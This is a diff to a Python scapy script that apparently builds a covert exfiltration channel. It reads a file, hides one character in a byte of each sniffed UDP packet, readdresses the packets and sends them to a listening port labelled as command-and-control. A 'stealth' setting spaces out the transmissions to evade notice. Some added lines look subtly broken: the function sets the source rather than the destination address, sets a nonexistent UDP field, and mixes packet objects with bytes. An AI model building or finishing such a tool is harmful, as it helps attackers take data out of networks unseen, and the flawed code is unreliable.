@@ -3,7 +3,9 @@ import base64
 import queue
 import time
 import scapy.all as scapy
+from scapy.all import sendp, sendpfast
 from scapy.layers.inet import UDP
+from scapy.layers.inet import IP
 from scapy.packet import Raw
 from scapy.packet import ls
 from scapy.all import bytes_hex
@@ -13,12 +15,14 @@ def encodePacket(packet, character):
     return packet[:66] + bytes(character, encoding="raw_unicode_escape") + packet[67:]
 
 
+def changeIPAndPort(packet, address, port):
+    packet[IP].src = address
+    packet[UDP].port = port
+    return packet
+
+
 def sendPacket(packet):
-    pass
-
-
-def sendEncodedPacket(packet, payload):
-    pass
+    sendp(packet)
 
 
 if __name__ == '__main__':
@@ -32,7 +36,8 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     stealthVal = args.stealth
-    stealthVal = 1
+    destinationAddress = args.destination_address
+    listeningPort = args.C2_listening_port
 
     if args.filename is not None:
         file = open(args.filename, 'rb')
@@ -49,17 +54,13 @@ if __name__ == '__main__':
     encodedPackets = 0
     sentPackets = 0
 
-    transmissionString = "a"
     while encodedPackets < len(transmissionString):
         if packetQ.qsize() > 0:
             pkt = packetQ.get()
-            if sentPackets % stealthVal == 0:
+            if sentPackets == 0:
+                sendPacket(changeIPAndPort(encodePacket(pkt, transmissionString[encodedPackets]), destinationAddress, listeningPort))
                 encodedPackets += 1
-                print(pkt.payload.payload.payload.original)
-                # print(bytes(pkt))
-                encodedPacket = encodePacket(bytes(pkt), transmissionString[sentPackets])
-                # print(encodedPacket)
+            sentPackets = (1 + sentPackets) % stealthVal
 
-            sentPackets += 1
     asyncSniffer.stop()
 
